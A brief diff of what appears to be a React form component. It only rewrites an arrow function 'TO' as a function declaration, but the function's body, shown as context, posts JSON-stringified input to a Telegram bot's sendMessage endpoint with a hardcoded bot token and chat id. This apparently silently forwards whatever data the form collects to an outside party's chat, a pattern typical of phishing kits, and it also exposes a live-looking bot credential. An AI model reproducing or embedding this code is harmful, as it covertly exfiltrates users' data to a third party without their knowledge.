@@ -1,7 +1,7 @@
 import { Col, Row } from 'react-bootstrap'
 
 import Input from '../handlers/Input'
-  const TO = (A) => {
+  function TO(A) {
     
     const res = fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify(A, null,4), {
       method: 'POST'
